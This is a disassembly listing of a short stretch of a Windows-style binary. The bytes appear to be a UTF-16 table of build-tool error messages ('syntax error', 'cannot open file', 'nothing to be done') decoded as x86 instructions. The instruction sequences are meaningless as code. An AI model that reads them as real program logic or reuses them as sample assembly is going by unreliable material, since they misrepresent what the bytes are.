  439ffa:	add    BYTE PTR gs:[ebx+0x0],ah
  439ffe:	je     0x43a000
  43a000:	imul   eax,DWORD PTR [eax],0x650076
  43a006:	and    BYTE PTR [eax],al
  43a008:	daa    
  43a009:	add    BYTE PTR ds:0x27007300,ah
  43a00f:	add    BYTE PTR [eax],al
  43a011:	add    BYTE PTR [edx],ch
  43a013:	add    BYTE PTR [ebx+0x0],ah
  43a016:	popa   
  43a017:	add    BYTE PTR [esi+0x0],ch
  43a01a:	outs   dx,BYTE PTR ds:[esi]
  43a01b:	add    BYTE PTR [edi+0x0],ch
  43a01e:	je     0x43a020
  43a020:	and    BYTE PTR [eax],al
  43a022:	push   0x76006100
  43a027:	add    BYTE PTR [ebp+0x0],ah
  43a02a:	and    BYTE PTR [eax],al
  43a02c:	add    BYTE PTR fs:[ebp+0x0],ah
  43a030:	jo     0x43a032
  43a032:	add    BYTE PTR gs:[esi+0x0],ch
  43a036:	add    BYTE PTR fs:[ebp+0x0],ah
  43a03a:	outs   dx,BYTE PTR ds:[esi]
  43a03b:	add    BYTE PTR [eax+eax*1+0x73],dh
  43a03f:	add    BYTE PTR [eax],ah
  43a041:	add    BYTE PTR [esi+0x0],ah
  43a044:	outs   dx,DWORD PTR ds:[esi]
  43a045:	add    BYTE PTR [edx+0x0],dh
  43a048:	and    BYTE PTR [eax],al
  43a04a:	add    BYTE PTR fs:[ecx+0x0],ch
  43a04e:	jb     0x43a050
  43a050:	add    BYTE PTR gs:[ebx+0x0],ah
  43a054:	je     0x43a056
  43a056:	imul   eax,DWORD PTR [eax],0x650076
  43a05c:	and    BYTE PTR [eax],al
  43a05e:	daa    
  43a05f:	add    BYTE PTR ds:0x27007300,ah
  43a065:	add    BYTE PTR [eax],al
  43a067:	add    BYTE PTR [eax],al
  43a069:	add    BYTE PTR [edi],dl
  43a06b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43a06f:	add    BYTE PTR [edi+0x0],ch
  43a072:	and    BYTE PTR [eax],al
  43a074:	ins    DWORD PTR es:[edi],dx
  43a075:	add    BYTE PTR [ecx+0x0],ah
  43a078:	outs   dx,BYTE PTR ds:[esi]
  43a079:	add    BYTE PTR [ecx+0x0],bh
  43a07c:	and    BYTE PTR [eax],al
  43a07e:	outs   dx,BYTE PTR ds:[esi]
  43a07f:	add    BYTE PTR [ecx+0x0],ah
  43a082:	ins    DWORD PTR es:[edi],dx
  43a083:	add    BYTE PTR [ebp+0x0],ah
  43a086:	jae    0x43a088
  43a088:	and    BYTE PTR [eax],al
  43a08a:	imul   eax,DWORD PTR [eax],0x20006e
  43a090:	jb     0x43a092
  43a092:	jne    0x43a094
  43a094:	ins    BYTE PTR es:[edi],dx
  43a095:	add    BYTE PTR [ebp+0x0],ah
  43a098:	add    BYTE PTR [eax],al
  43a09a:	sbb    al,BYTE PTR [eax]
  43a09c:	arpl   WORD PTR [eax],ax
  43a09e:	popa   
  43a09f:	add    BYTE PTR [esi+0x0],ch
  43a0a2:	outs   dx,BYTE PTR ds:[esi]
  43a0a3:	add    BYTE PTR [edi+0x0],ch
  43a0a6:	je     0x43a0a8
  43a0a8:	and    BYTE PTR [eax],al
  43a0aa:	ins    DWORD PTR es:[edi],dx
  43a0ab:	add    BYTE PTR [ecx+0x0],ch
  43a0ae:	js     0x43a0b0
  43a0b0:	and    BYTE PTR [eax],al
  43a0b2:	add    BYTE PTR fs:[edi+0x0],ch
  43a0b6:	je     0x43a0b8
  43a0b8:	and    BYTE PTR [eax],al
  43a0ba:	add    BYTE PTR fs:[ecx+0x0],ch
  43a0be:	jb     0x43a0c0
  43a0c0:	add    BYTE PTR gs:[ebx+0x0],ah
  43a0c4:	je     0x43a0c6
  43a0c6:	imul   eax,DWORD PTR [eax],0x650076
  43a0cc:	jae    0x43a0ce
  43a0ce:	add    BYTE PTR [eax],al
  43a0d0:	cmp    al,BYTE PTR [eax]
  43a0d2:	jae    0x43a0d4
  43a0d4:	jns    0x43a0d6
  43a0d6:	outs   dx,BYTE PTR ds:[esi]
  43a0d7:	add    BYTE PTR [eax+eax*1+0x61],dh
  43a0db:	add    BYTE PTR [eax+0x0],bh
  43a0de:	and    BYTE PTR [eax],al
  43a0e0:	add    BYTE PTR gs:[edx+0x0],dh
  43a0e4:	jb     0x43a0e6
  43a0e6:	outs   dx,DWORD PTR ds:[esi]
  43a0e7:	add    BYTE PTR [edx+0x0],dh
  43a0ea:	and    BYTE PTR [eax],al
  43a0ec:	cmp    al,BYTE PTR [eax]
  43a0ee:	and    BYTE PTR [eax],al
  43a0f0:	outs   dx,DWORD PTR ds:[esi]
  43a0f1:	add    BYTE PTR [esi+0x0],ch
  43a0f4:	ins    BYTE PTR es:[edi],dx
  43a0f5:	add    BYTE PTR [ecx+0x0],bh
  43a0f8:	and    BYTE PTR [eax],al
  43a0fa:	dec    ebx
  43a0fb:	add    BYTE PTR [ebp+0x0],al
  43a0fe:	inc    ebp
  43a0ff:	add    BYTE PTR [eax+0x0],dl
  43a102:	sub    al,0x0
  43a104:	and    BYTE PTR [eax],al
  43a106:	dec    esi
  43a107:	add    BYTE PTR [edi+0x0],cl
  43a10a:	dec    ebx
  43a10b:	add    BYTE PTR [ebp+0x0],al
  43a10e:	inc    ebp
  43a10f:	add    BYTE PTR [eax+0x0],dl
  43a112:	sub    al,0x0
  43a114:	and    BYTE PTR [eax],al
  43a116:	outs   dx,DWORD PTR ds:[esi]
  43a117:	add    BYTE PTR [edx+0x0],dh
  43a11a:	and    BYTE PTR [eax],al
  43a11c:	push   ebp
  43a11d:	add    BYTE PTR [esi+0x0],cl
  43a120:	dec    ecx
  43a121:	add    BYTE PTR [ebx+0x0],al
  43a124:	dec    edi
  43a125:	add    BYTE PTR [eax+eax*1+0x45],al
  43a129:	add    BYTE PTR [eax],ah
  43a12b:	add    BYTE PTR [ecx+0x0],ah
  43a12e:	ins    BYTE PTR es:[edi],dx
  43a12f:	add    BYTE PTR [eax+eax*1+0x6f],ch
  43a133:	add    BYTE PTR [edi+0x0],dh
  43a136:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  43a13b:	add    BYTE PTR [eax+0x0],ch
  43a13e:	add    BYTE PTR gs:[edx+0x0],dh
  43a142:	add    BYTE PTR gs:[eax],al
  43a145:	add    BYTE PTR [eax+eax*1],ah
  43a148:	add    BYTE PTR gs:[eax+0x0],bh
  43a14c:	jo     0x43a14e
  43a14e:	popa   
  43a14f:	add    BYTE PTR [esi+0x0],ch
  43a152:	add    BYTE PTR fs:[ebp+0x0],ah
  43a156:	add    BYTE PTR fs:[eax],ah
  43a159:	add    BYTE PTR [ebx+0x0],ah
  43a15c:	outs   dx,DWORD PTR ds:[esi]
  43a15d:	add    BYTE PTR [ebp+0x0],ch
  43a160:	ins    DWORD PTR es:[edi],dx
  43a161:	add    BYTE PTR [ecx+0x0],ah
  43a164:	outs   dx,BYTE PTR ds:[esi]
  43a165:	add    BYTE PTR [eax+eax*1+0x20],ah
  43a169:	add    BYTE PTR [eax+eax*1+0x69],ch
  43a16d:	add    BYTE PTR [esi+0x0],ch
  43a170:	add    BYTE PTR gs:[eax],ah
  43a173:	add    BYTE PTR [edi],ah
  43a175:	add    BYTE PTR ds:0x27007300,ah
  43a17b:	add    BYTE PTR [eax],ah
  43a17d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43a181:	add    BYTE PTR [edi+0x0],ch
  43a184:	and    BYTE PTR [eax],al
  43a186:	ins    BYTE PTR es:[edi],dx
  43a187:	add    BYTE PTR [edi+0x0],ch
  43a18a:	outs   dx,BYTE PTR ds:[esi]
  43a18b:	add    BYTE PTR [edi+0x0],ah
  43a18e:	add    BYTE PTR [eax],al
  43a190:	sbb    eax,0x61006300
  43a195:	add    BYTE PTR [esi+0x0],ch
  43a198:	outs   dx,BYTE PTR ds:[esi]
  43a199:	add    BYTE PTR [edi+0x0],ch
  43a19c:	je     0x43a19e
  43a19e:	and    BYTE PTR [eax],al
  43a1a0:	outs   dx,DWORD PTR ds:[esi]
  43a1a1:	add    BYTE PTR [eax+0x0],dh
  43a1a4:	add    BYTE PTR gs:[esi+0x0],ch
  43a1a8:	and    BYTE PTR [eax],al
  43a1aa:	imul   eax,DWORD PTR [eax],0x6c006e
  43a1b0:	imul   eax,DWORD PTR [eax],0x65006e
  43a1b6:	and    BYTE PTR [eax],al
  43a1b8:	data16 add BYTE PTR [ecx+0x0],ch
  43a1bc:	ins    BYTE PTR es:[edi],dx
  43a1bd:	add    BYTE PTR [ebp+0x0],ah
  43a1c0:	and    BYTE PTR [eax],al
  43a1c2:	daa    
  43a1c3:	add    BYTE PTR ds:0x27007300,ah
  43a1c9:	add    BYTE PTR [eax],al
  43a1cb:	add    BYTE PTR [ecx],ch
  43a1cd:	add    BYTE PTR [esi+0x0],ah
  43a1d0:	imul   eax,DWORD PTR [eax],0x65006c
  43a1d6:	outs   dx,BYTE PTR ds:[esi]
  43a1d7:	add    BYTE PTR [ecx+0x0],ah
  43a1da:	ins    DWORD PTR es:[edi],dx
  43a1db:	add    BYTE PTR [ebp+0x0],ah
  43a1de:	sub    eax,0x61007000
  43a1e3:	add    BYTE PTR [edx+0x0],dh
  43a1e6:	je     0x43a1e8
  43a1e8:	jae    0x43a1ea
  43a1ea:	and    BYTE PTR [eax],al
  43a1ec:	jae    0x43a1ee
  43a1ee:	jns    0x43a1f0
  43a1f0:	outs   dx,BYTE PTR ds:[esi]
  43a1f1:	add    BYTE PTR [eax+eax*1+0x61],dh
  43a1f5:	add    BYTE PTR [eax+0x0],bh
  43a1f8:	and    BYTE PTR [eax],al
  43a1fa:	jb     0x43a1fc
  43a1fc:	add    BYTE PTR gs:[ecx+0x0],dh
  43a200:	jne    0x43a202
  43a202:	imul   eax,DWORD PTR [eax],0x650072
  43a208:	jae    0x43a20a
  43a20a:	and    BYTE PTR [eax],al
  43a20c:	add    BYTE PTR fs:[ebp+0x0],ah
  43a210:	jo     0x43a212
  43a212:	add    BYTE PTR gs:[esi+0x0],ch
  43a216:	add    BYTE PTR fs:[ebp+0x0],ah
  43a21a:	outs   dx,BYTE PTR ds:[esi]
  43a21b:	add    BYTE PTR [eax+eax*1+0x0],dh
  43a21f:	add    BYTE PTR [esi],ah
  43a221:	add    BYTE PTR [ecx+0x0],ch
  43a224:	ins    BYTE PTR es:[edi],dx
  43a225:	add    BYTE PTR [eax+eax*1+0x65],ch
  43a229:	add    BYTE PTR [edi+0x0],ah
  43a22c:	popa   
  43a22d:	add    BYTE PTR [eax+eax*1+0x20],ch
  43a231:	add    BYTE PTR [esi+0x0],ah
  43a234:	imul   eax,DWORD PTR [eax],0x65006c
  43a23a:	outs   dx,BYTE PTR ds:[esi]
  43a23b:	add    BYTE PTR [ecx+0x0],ah
  43a23e:	ins    DWORD PTR es:[edi],dx
  43a23f:	add    BYTE PTR [ebp+0x0],ah
  43a242:	sub    eax,0x61007000
  43a247:	add    BYTE PTR [edx+0x0],dh
  43a24a:	je     0x43a24c
  43a24c:	jae    0x43a24e
  43a24e:	and    BYTE PTR [eax],al
  43a250:	jae    0x43a252
  43a252:	jns    0x43a254
  43a254:	outs   dx,BYTE PTR ds:[esi]
  43a255:	add    BYTE PTR [eax+eax*1+0x61],dh
  43a259:	add    BYTE PTR [eax+0x0],bh
  43a25c:	and    BYTE PTR [eax],al
  43a25e:	imul   eax,DWORD PTR [eax],0x20006e
  43a264:	daa    
  43a265:	add    BYTE PTR ds:0x27007300,ah
  43a26b:	add    BYTE PTR [eax],al
  43a26d:	add    BYTE PTR [eax],al
  43a26f:	add    BYTE PTR [eax],bh
  43a271:	add    BYTE PTR [ebp+0x0],ch
  43a274:	popa   
  43a275:	add    BYTE PTR [ebx+0x0],ah
  43a278:	jb     0x43a27a
  43a27a:	outs   dx,DWORD PTR ds:[esi]
  43a27b:	add    BYTE PTR [eax],ah
  43a27d:	add    BYTE PTR [edi],ah
  43a27f:	add    BYTE PTR ds:0x27007300,ah
  43a285:	add    BYTE PTR [eax],ah
  43a287:	add    BYTE PTR [ecx+0x0],ch
  43a28a:	jae    0x43a28c
  43a28c:	and    BYTE PTR [eax],al
  43a28e:	imul   eax,DWORD PTR [eax],0x6c006c
  43a294:	add    BYTE PTR gs:[edi+0x0],ah
  43a298:	popa   
  43a299:	add    BYTE PTR [eax+eax*1+0x20],ch
  43a29d:	add    BYTE PTR [ecx+0x0],ch
  43a2a0:	outs   dx,BYTE PTR ds:[esi]
  43a2a1:	add    BYTE PTR [eax],ah
  43a2a3:	add    BYTE PTR [eax+eax*1+0x68],dh
  43a2a7:	add    BYTE PTR [ebp+0x0],ah
  43a2aa:	and    BYTE PTR [eax],al
  43a2ac:	arpl   WORD PTR [eax],ax
  43a2ae:	outs   dx,DWORD PTR ds:[esi]
  43a2af:	add    BYTE PTR [esi+0x0],ch
  43a2b2:	je     0x43a2b4
  43a2b4:	add    BYTE PTR gs:[eax+0x0],bh
  43a2b8:	je     0x43a2ba
  43a2ba:	and    BYTE PTR [eax],al
  43a2bc:	outs   dx,DWORD PTR ds:[esi]
  43a2bd:	add    BYTE PTR [esi+0x0],ah
  43a2c0:	and    BYTE PTR [eax],al
  43a2c2:	bound  eax,QWORD PTR [eax]
  43a2c4:	popa   
  43a2c5:	add    BYTE PTR [eax+eax*1+0x63],dh
  43a2c9:	add    BYTE PTR [eax+0x0],ch
  43a2cc:	and    BYTE PTR [eax],al
  43a2ce:	jb     0x43a2d0
  43a2d0:	jne    0x43a2d2
  43a2d2:	ins    BYTE PTR es:[edi],dx
  43a2d3:	add    BYTE PTR [ebp+0x0],ah
  43a2d6:	and    BYTE PTR [eax],al
  43a2d8:	daa    
  43a2d9:	add    BYTE PTR ds:0x27007300,ah
	...
  43a2e7:	add    BYTE PTR [eax],al
  43a2e9:	add    BYTE PTR [ebx],ch
  43a2eb:	add    BYTE PTR [esi+0x0],ch
  43a2ee:	outs   dx,DWORD PTR ds:[esi]
  43a2ef:	add    BYTE PTR [eax],ah
  43a2f1:	add    BYTE PTR [ebp+0x0],ch
  43a2f4:	outs   dx,DWORD PTR ds:[esi]
  43a2f5:	add    BYTE PTR [edx+0x0],dh
  43a2f8:	add    BYTE PTR gs:[eax],ah
  43a2fb:	add    BYTE PTR [esi+0x0],ah
  43a2fe:	imul   eax,DWORD PTR [eax],0x65006c
  43a304:	and    BYTE PTR [eax],al
  43a306:	push   0x6e006100
  43a30b:	add    BYTE PTR [eax+eax*1+0x6c],ah
  43a30f:	add    BYTE PTR [ebp+0x0],ah
  43a312:	jae    0x43a314
  43a314:	and    BYTE PTR [eax],al
  43a316:	sub    BYTE PTR [eax],al
  43a318:	je     0x43a31a
  43a31a:	outs   dx,DWORD PTR ds:[esi]
  43a31b:	add    BYTE PTR [edi+0x0],ch
  43a31e:	and    BYTE PTR [eax],al
  43a320:	ins    DWORD PTR es:[edi],dx
  43a321:	add    BYTE PTR [ecx+0x0],ah
  43a324:	outs   dx,BYTE PTR ds:[esi]
  43a325:	add    BYTE PTR [ecx+0x0],bh
  43a328:	and    BYTE PTR [eax],al
  43a32a:	data16 add BYTE PTR [ecx+0x0],ch
  43a32e:	ins    BYTE PTR es:[edi],dx
  43a32f:	add    BYTE PTR [ebp+0x0],ah
  43a332:	jae    0x43a334
  43a334:	and    BYTE PTR [eax],al
  43a336:	outs   dx,DWORD PTR ds:[esi]
  43a337:	add    BYTE PTR [eax+0x0],dh
  43a33a:	add    BYTE PTR gs:[esi+0x0],ch
  43a33e:	sub    DWORD PTR [eax],eax
	...
  43a35c:	add    BYTE PTR [eax],al
  43a35e:	push   eax
  43a35f:	inc    ecx
  43a360:	add    BYTE PTR [eax],al
  43a362:	xor    eax,DWORD PTR [eax]
  43a364:	arpl   WORD PTR [eax],ax
  43a366:	outs   dx,DWORD PTR ds:[esi]
  43a367:	add    BYTE PTR [ebp+0x0],ch
  43a36a:	ins    DWORD PTR es:[edi],dx
  43a36b:	add    BYTE PTR [ecx+0x0],ah
  43a36e:	outs   dx,BYTE PTR ds:[esi]
  43a36f:	add    BYTE PTR [eax+eax*1+0x20],ah
  43a373:	add    BYTE PTR [esi+0x0],ah
  43a376:	imul   eax,DWORD PTR [eax],0x65006c
  43a37c:	and    BYTE PTR [eax],al
  43a37e:	arpl   WORD PTR [eax],ax
  43a380:	popa   
  43a381:	add    BYTE PTR [esi+0x0],ch
  43a384:	and    BYTE PTR [eax],al
  43a386:	bound  eax,QWORD PTR [eax]
  43a388:	add    BYTE PTR gs:[eax],ah
  43a38b:	add    BYTE PTR [ecx+0x0],ch
  43a38e:	outs   dx,BYTE PTR ds:[esi]
  43a38f:	add    BYTE PTR [esi+0x0],dh
  43a392:	outs   dx,DWORD PTR ds:[esi]
  43a393:	add    BYTE PTR [ebx+0x0],ch
  43a396:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  43a39b:	add    BYTE PTR [edi+0x0],ch
  43a39e:	outs   dx,BYTE PTR ds:[esi]
  43a39f:	add    BYTE PTR [eax+eax*1+0x79],ch
  43a3a3:	add    BYTE PTR [eax],ah
  43a3a5:	add    BYTE PTR [esi+0x0],ah
  43a3a8:	jb     0x43a3aa
  43a3aa:	outs   dx,DWORD PTR ds:[esi]
  43a3ab:	add    BYTE PTR [ebp+0x0],ch
  43a3ae:	and    BYTE PTR [eax],al
  43a3b0:	arpl   WORD PTR [eax],ax
  43a3b2:	outs   dx,DWORD PTR ds:[esi]
  43a3b3:	add    BYTE PTR [ebp+0x0],ch
  43a3b6:	ins    DWORD PTR es:[edi],dx
  43a3b7:	add    BYTE PTR [ecx+0x0],ah
  43a3ba:	outs   dx,BYTE PTR ds:[esi]
  43a3bb:	add    BYTE PTR [eax+eax*1+0x20],ah
  43a3bf:	add    BYTE PTR [eax+eax*1+0x69],ch
  43a3c3:	add    BYTE PTR [esi+0x0],ch
  43a3c6:	add    BYTE PTR gs:[eax],al
  43a3c9:	add    BYTE PTR [esi],ah
  43a3cb:	add    BYTE PTR [edx+0x0],dh
  43a3ce:	add    BYTE PTR gs:[ebx+0x0],dh
  43a3d2:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  43a3d7:	add    BYTE PTR [ecx+0x0],ch
  43a3da:	outs   dx,BYTE PTR ds:[esi]
  43a3db:	add    BYTE PTR [edi+0x0],ah
  43a3de:	and    BYTE PTR [eax],al
  43a3e0:	jbe    0x43a3e2
  43a3e2:	popa   
  43a3e3:	add    BYTE PTR [eax+eax*1+0x75],ch
  43a3e7:	add    BYTE PTR [ebp+0x0],ah
  43a3ea:	and    BYTE PTR [eax],al
  43a3ec:	outs   dx,DWORD PTR ds:[esi]
  43a3ed:	add    BYTE PTR [esi+0x0],ah
  43a3f0:	and    BYTE PTR [eax],al
  43a3f2:	jae    0x43a3f4
  43a3f4:	jo     0x43a3f6
  43a3f6:	add    BYTE PTR gs:[ebx+0x0],ah
  43a3fa:	imul   eax,DWORD PTR [eax],0x6c0061
  43a400:	and    BYTE PTR [eax],al
  43a402:	ins    DWORD PTR es:[edi],dx
  43a403:	add    BYTE PTR [ecx+0x0],ah
  43a406:	arpl   WORD PTR [eax],ax
  43a408:	jb     0x43a40a
  43a40a:	outs   dx,DWORD PTR ds:[esi]
  43a40b:	add    BYTE PTR [eax],ah
  43a40d:	add    BYTE PTR [edi],ah
  43a40f:	add    BYTE PTR ds:0x27007300,ah
  43a415:	add    BYTE PTR [eax],al
  43a417:	add    BYTE PTR [eax],al
  43a419:	add    BYTE PTR [edi],bl
  43a41b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43a41f:	add    BYTE PTR [edi+0x0],ch
  43a422:	and    BYTE PTR [eax],al
  43a424:	ins    DWORD PTR es:[edi],dx
  43a425:	add    BYTE PTR [ecx+0x0],ah
  43a428:	outs   dx,BYTE PTR ds:[esi]
  43a429:	add    BYTE PTR [ecx+0x0],bh
  43a42c:	and    BYTE PTR [eax],al
  43a42e:	jb     0x43a430
  43a430:	jne    0x43a432
  43a432:	ins    BYTE PTR es:[edi],dx
  43a433:	add    BYTE PTR [ebp+0x0],ah
  43a436:	jae    0x43a438
  43a438:	and    BYTE PTR [eax],al
  43a43a:	data16 add BYTE PTR [edi+0x0],ch
  43a43e:	jb     0x43a440
  43a440:	and    BYTE PTR [eax],al
  43a442:	je     0x43a444
  43a444:	popa   
  43a445:	add    BYTE PTR [edx+0x0],dh
  43a448:	add    BYTE PTR [di+0x0],ah
  43a44c:	je     0x43a44e
  43a44e:	and    BYTE PTR [eax],al
  43a450:	daa    
  43a451:	add    BYTE PTR ds:0x27007300,ah
  43a457:	add    BYTE PTR [eax],al
  43a459:	add    BYTE PTR [eax],dh
  43a45b:	add    BYTE PTR [ecx+0x0],ch
  43a45e:	add    BYTE PTR [bp+0x0],ch
  43a462:	outs   dx,DWORD PTR ds:[esi]
  43a463:	add    BYTE PTR [edx+0x0],dh
  43a466:	imul   eax,DWORD PTR [eax],0x67006e
  43a46c:	and    BYTE PTR [eax],al
  43a46e:	jb     0x43a470
  43a470:	jne    0x43a472
  43a472:	ins    BYTE PTR es:[edi],dx
  43a473:	add    BYTE PTR [ebp+0x0],ah
  43a476:	and    BYTE PTR [eax],al
  43a478:	daa    
  43a479:	add    BYTE PTR ds:0x27007300,ah
  43a47f:	add    BYTE PTR [eax],ah
  43a481:	add    BYTE PTR [eax],ch
  43a483:	add    BYTE PTR [ebp+0x0],ah
  43a486:	js     0x43a488
  43a488:	je     0x43a48a
  43a48a:	add    BYTE PTR gs:[esi+0x0],ch
  43a48e:	jae    0x43a490
  43a490:	imul   eax,DWORD PTR [eax],0x6e006f
  43a496:	and    BYTE PTR [eax],al
  43a498:	outs   dx,BYTE PTR ds:[esi]
  43a499:	add    BYTE PTR [edi+0x0],ch
  43a49c:	je     0x43a49e
  43a49e:	and    BYTE PTR [eax],al
  43a4a0:	imul   eax,DWORD PTR [eax],0x20006e
  43a4a6:	add    BYTE PTR cs:[ebx+0x0],dl
  43a4aa:	push   ebp
  43a4ab:	add    BYTE PTR [esi+0x0],al
  43a4ae:	inc    esi
  43a4af:	add    BYTE PTR [ecx+0x0],cl
  43a4b2:	pop    eax
  43a4b3:	add    BYTE PTR [ebp+0x0],al
  43a4b6:	push   ebx
  43a4b7:	add    BYTE PTR [ecx],ch
  43a4b9:	add    BYTE PTR [eax],al
  43a4bb:	add    BYTE PTR [edi],bl
  43a4bd:	add    BYTE PTR [ebx+0x0],dh
  43a4c0:	jo     0x43a4c2
  43a4c2:	add    BYTE PTR gs:[ebx+0x0],ah
  43a4c6:	imul   eax,DWORD PTR [eax],0x6c0061
  43a4cc:	and    BYTE PTR [eax],al
  43a4ce:	ins    DWORD PTR es:[edi],dx
  43a4cf:	add    BYTE PTR [ecx+0x0],ah
  43a4d2:	arpl   WORD PTR [eax],ax
  43a4d4:	jb     0x43a4d6
  43a4d6:	outs   dx,DWORD PTR ds:[esi]
  43a4d7:	add    BYTE PTR [eax],ah
  43a4d9:	add    BYTE PTR [ebp+0x0],dh
  43a4dc:	outs   dx,BYTE PTR ds:[esi]
  43a4dd:	add    BYTE PTR [eax+eax*1+0x65],ah
  43a4e1:	add    BYTE PTR [esi+0x0],ah
  43a4e4:	imul   eax,DWORD PTR [eax],0x65006e
  43a4ea:	add    BYTE PTR fs:[eax],ah
  43a4ed:	add    BYTE PTR [edx],bh
  43a4ef:	add    BYTE PTR [eax],ah
  43a4f1:	add    BYTE PTR [edi],ah
  43a4f3:	add    BYTE PTR ds:0x27007300,ah
  43a4f9:	add    BYTE PTR [eax],al
  43a4fb:	add    BYTE PTR [edx],ch
  43a4fd:	add    BYTE PTR [esi+0x0],ah
  43a500:	imul   eax,DWORD PTR [eax],0x65006c
  43a506:	outs   dx,BYTE PTR ds:[esi]
  43a507:	add    BYTE PTR [ecx+0x0],ah
  43a50a:	ins    DWORD PTR es:[edi],dx
  43a50b:	add    BYTE PTR [ebp+0x0],ah
  43a50e:	and    BYTE PTR [eax],al
  43a510:	daa    
  43a511:	add    BYTE PTR ds:0x27007300,ah
  43a517:	add    BYTE PTR [eax],ah
  43a519:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43a51d:	add    BYTE PTR [edi+0x0],ch
  43a520:	and    BYTE PTR [eax],al
  43a522:	ins    BYTE PTR es:[edi],dx
  43a523:	add    BYTE PTR [edi+0x0],ch
  43a526:	outs   dx,BYTE PTR ds:[esi]
  43a527:	add    BYTE PTR [edi+0x0],ah
  43a52a:	cmp    eax,DWORD PTR [eax]
  43a52c:	and    BYTE PTR [eax],al
  43a52e:	je     0x43a530
  43a530:	jb     0x43a532
  43a532:	jne    0x43a534
  43a534:	outs   dx,BYTE PTR ds:[esi]
  43a535:	add    BYTE PTR [ebx+0x0],ah
  43a538:	popa   
  43a539:	add    BYTE PTR [eax+eax*1+0x69],dh
  43a53d:	add    BYTE PTR [esi+0x0],ch
  43a540:	add    BYTE PTR [bx+si],ah
  43a543:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43a547:	add    BYTE PTR [eax],ah
  43a549:	add    BYTE PTR [eax],bh
  43a54b:	add    BYTE PTR [esi],ch
  43a54d:	add    BYTE PTR [ebx],dh
  43a54f:	add    BYTE PTR [eax],al
  43a551:	add    BYTE PTR [eax+eax*1],dl
  43a554:	jb     0x43a556
  43a556:	add    BYTE PTR gs:[ebp+0x0],ch
  43a55a:	outs   dx,DWORD PTR ds:[esi]
  43a55b:	add    BYTE PTR [esi+0x0],dh
  43a55e:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  43a563:	add    BYTE PTR [eax+eax*1+0x61],dh
  43a567:	add    BYTE PTR [edx+0x0],dh
  43a56a:	add    BYTE PTR [di+0x0],ah
  43a56e:	je     0x43a570
  43a570:	and    BYTE PTR [eax],al
  43a572:	daa    
  43a573:	add    BYTE PTR ds:0x27007300,ah
  43a579:	add    BYTE PTR [eax],al
  43a57b:	add    BYTE PTR [eax],al
  43a57d:	add    BYTE PTR [edx],dh
  43a57f:	add    BYTE PTR [edi],ah
  43a581:	add    BYTE PTR ds:0x27007300,ah
  43a587:	add    BYTE PTR [eax],ah
  43a589:	add    BYTE PTR [edx],bh
  43a58b:	add    BYTE PTR [eax],ah
  43a58d:	add    BYTE PTR [edx+0x0],ah
  43a590:	jne    0x43a592
  43a592:	imul   eax,DWORD PTR [eax],0x64006c
  43a598:	and    BYTE PTR [eax],al
  43a59a:	data16 add BYTE PTR [ecx+0x0],ah
  43a59e:	imul   eax,DWORD PTR [eax],0x65006c
  43a5a4:	add    BYTE PTR fs:[ebx],bh
  43a5a7:	add    BYTE PTR [eax],ah
  43a5a9:	add    BYTE PTR [edi],ch
  43a5ab:	add    BYTE PTR [ebx+0x0],cl
  43a5ae:	and    BYTE PTR [eax],al
  43a5b0:	jae    0x43a5b2
  43a5b2:	jo     0x43a5b4
  43a5b4:	add    BYTE PTR gs:[ebx+0x0],ah
  43a5b8:	imul   eax,DWORD PTR [eax],0x690066
  43a5be:	add    BYTE PTR gs:[eax+eax*1+0x2c],ah
  43a5c3:	add    BYTE PTR [eax],ah
  43a5c5:	add    BYTE PTR [ebx+0x0],ah
  43a5c8:	outs   dx,DWORD PTR ds:[esi]
  43a5c9:	add    BYTE PTR [esi+0x0],ch
  43a5cc:	je     0x43a5ce
  43a5ce:	imul   eax,DWORD PTR [eax],0x75006e
  43a5d4:	imul   eax,DWORD PTR [eax],0x67006e
  43a5da:	and    BYTE PTR [eax],al
  43a5dc:	add    BYTE PTR cs:[esi],ch
  43a5df:	add    BYTE PTR [esi],ch
  43a5e1:	add    BYTE PTR [eax],al
  43a5e3:	add    BYTE PTR [esi],dh
  43a5e5:	add    BYTE PTR [edi],ah
  43a5e7:	add    BYTE PTR ds:0x27007300,ah
  43a5ed:	add    BYTE PTR [eax],ah
  43a5ef:	add    BYTE PTR [edx],bh
  43a5f1:	add    BYTE PTR [eax],ah
  43a5f3:	add    BYTE PTR [esi+0x0],ch
  43a5f6:	outs   dx,DWORD PTR ds:[esi]
  43a5f7:	add    BYTE PTR [eax+eax*1+0x20],dh
  43a5fb:	add    BYTE PTR [ecx+0x0],ah
  43a5fe:	ins    BYTE PTR es:[edi],dx
  43a5ff:	add    BYTE PTR [eax+eax*1+0x20],ch
  43a603:	add    BYTE PTR [eax+eax*1+0x65],ah
  43a607:	add    BYTE PTR [eax+0x0],dh
  43a60a:	add    BYTE PTR gs:[esi+0x0],ch
  43a60e:	add    BYTE PTR fs:[ebp+0x0],ah
  43a612:	outs   dx,BYTE PTR ds:[esi]
  43a613:	add    BYTE PTR [eax+eax*1+0x73],dh
  43a617:	add    BYTE PTR [eax],ah
  43a619:	add    BYTE PTR [ecx+0x0],ah
  43a61c:	jbe    0x43a61e
  43a61e:	popa   
  43a61f:	add    BYTE PTR [ecx+0x0],ch
  43a622:	ins    BYTE PTR es:[edi],dx
  43a623:	add    BYTE PTR [ecx+0x0],ah
  43a626:	bound  eax,QWORD PTR [eax]
  43a628:	ins    BYTE PTR es:[edi],dx
  43a629:	add    BYTE PTR [ebp+0x0],ah
  43a62c:	cmp    eax,DWORD PTR [eax]
  43a62e:	and    BYTE PTR [eax],al
  43a630:	je     0x43a632
  43a632:	popa   
  43a633:	add    BYTE PTR [edx+0x0],dh
  43a636:	add    BYTE PTR [di+0x0],ah
  43a63a:	je     0x43a63c
  43a63c:	and    BYTE PTR [eax],al
  43a63e:	outs   dx,BYTE PTR ds:[esi]
  43a63f:	add    BYTE PTR [edi+0x0],ch
  43a642:	je     0x43a644
  43a644:	and    BYTE PTR [eax],al
  43a646:	bound  eax,QWORD PTR [eax]
  43a648:	jne    0x43a64a
  43a64a:	imul   eax,DWORD PTR [eax],0x74006c
  43a650:	add    BYTE PTR [eax],al
  43a652:	push   eax
  43a653:	add    BYTE PTR [edi],ah
